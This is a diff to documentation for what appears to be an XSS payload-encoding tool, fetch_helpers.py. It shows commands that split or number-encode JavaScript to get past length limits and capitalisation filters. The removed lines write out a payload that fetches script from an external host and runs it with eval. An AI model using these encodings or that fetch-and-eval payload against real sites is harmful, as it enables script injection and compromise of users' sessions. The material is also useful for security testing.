@@ -90,10 +90,10 @@ T(T(J,Z),E)
 Replace the encoded payload above with the output from:
 
 ```
-python2 fetch_helpers.py "fetch('//myown/external/js').then(r=>r.text().then(eval))" -e split_to_len --maxLen 10
+python2 fetch_helpers.py -x '//myown/external/js' -e split_to_len --maxLen 10
 ```
 
-**Note:** You can adjust the maximum length, but it has to be greater than 10. If it wasn't for the `<script>` tags it could be done with 8 characters per line, but I don't know of a wrapping that would work other than `<script>`.
+**Note:** You can give it an arbitrary payload using the `-p` option. You can also adjust the maximum length. See `python2 fetch_helpers.py --help` for more options.
 
 ---
 ### Dealing with input transformation
@@ -168,10 +168,10 @@ J=25885457[N](36) // "fetch"
 Replace the encoded payload above, in `(X[C](`**_encoded payload_**`))()`, with the output from:
 
 ```
-python2 fetch_helpers.py "fetch('//myown/external/js').then(r=>r.text().then(eval))" -e num_to_string --toString N
+python2 fetch_helpers.py -x '//myown/external/js' -e num_to_string --toString N
 ```
 
-or whatever other payload you want to use in place of `fetch...`. See `python2 fetch_helpers.py --help` for more options.
+**Note:** You can give it an arbitrary payload using the `-p` option. See `python2 fetch_helpers.py --help` for more options.
 
 ##### Usecase: payload is being capitalized, character limit &gt;= 10
 * *No additional wrapping needed*
